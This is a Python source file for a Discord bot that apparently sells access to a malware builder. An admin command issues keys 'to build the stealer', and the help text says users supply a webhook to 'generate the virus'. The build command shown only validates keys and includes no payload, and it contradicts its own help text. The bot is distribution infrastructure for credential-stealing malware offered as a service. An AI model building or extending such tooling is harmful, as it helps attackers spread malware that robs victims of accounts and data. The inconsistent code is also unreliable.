import discord
from discord.ext import commands
import base64, secrets
Red = "\033[0;31m"
End = "\033[0m"
Green = "\033[0;32m"

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
bot.remove_command('help')

Bot_token = 'Bot Token'
channelid = ID # The channel where the builder will work
admin = ID # The admin ID (He can generate key for user)


@bot.event
async def on_ready():
    await bot.tree.sync()
    print("Bot en ligne !")

@bot.event
async def on_ready():
    await bot.tree.sync()


@bot.tree.command(name="help", description="Here's a command to get help for the bot")
async def help(interaction: discord.Interaction):
    embed = discord.Embed(title="Commands List", description="", color=0x00ff00)
    embed.add_field(name="Admin Command:", value="```generatekey + (User)```\nThis command will generate a key for the user to build the stealer from the bot", inline=False)
    embed.add_field(name="User command:", value="```Build + (Webhook) + (Key)```\nThis command will generate the virus with the chosen webhook", inline=False)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="generatekey", description="Generate a key to use the Builder")
@commands.is_owner()
async def generatekey(interaction: discord.Interaction, user: discord.Member):
    if interaction.user.id == admin:
        secr = secrets.token_urlsafe(32)
        with open('keys.txt', "a") as f:
            f.write(f"{user.id}|{secr}|{user.name}\n")
        print(f"{Red}New{End} Generated key\n{Red}User{End}: {user.id}\n{Red}Key{End}: {secr}\n{Red}Username{End}: {user.name}")

        embed = discord.Embed(title="Here your key :", description="Thanks for using our service.", color=0x00ff00)
        embed.add_field(name="Key:\n", value=f"{secr}", inline=False)
        embed.add_field(name="How to use it:\n", value=f"Go into the command channel and do ```/Build (key) (Webhook)``` and the program will be sent into your DM", inline=False)
        await user.send(embed=embed)
    else:
        await interaction.response.send_message("You don't have the permission to use that command")



@bot.tree.command(name="build", description="Generate a key to use the Builder")
async def Build(interaction: discord.Interaction, key: str):
    user_id = str(interaction.user.id) 

    if interaction.channel_id != channelid:
        await interaction.response.send_message(f"Wrong channel you need to use this command in this channel : <#{channelid}>")
        return

    with open('keys.txt', 'r') as f:
        lines = f.readlines()

    for line in lines:
        parts = line.strip().split("|")
        stored_user_id = parts[0]
        stored_key = parts[1]
        stored_username = parts[2]

        if user_id == stored_user_id and key == stored_key:
            await interaction.response.send_message("User ID and key combination is valid.")
            return
        elif key == stored_key:
            print(f"\n{Red}User{End}: {interaction.user.name} used a working key\n{Red}but not their own key{End}: {key}\n{Red}Username of the person that owns the key{End}: {stored_username}\n")


    embed = discord.Embed(title="Error", description="Key is invalid, try again", color=0xFF0000)
    embed.add_field(name="Why:\n", value="Maybe your user ID is not associated with the key.\nIf you think this is yours, open a ticket and an admin will try to help you.", inline=False)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="ban", description="Ban a user")
@commands.has_permissions(ban_members=True)
async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    await member.ban(reason=reason)
    await interaction.response.send_message(f"User {member.mention} has been banned.")


bot.run(Bot_token)
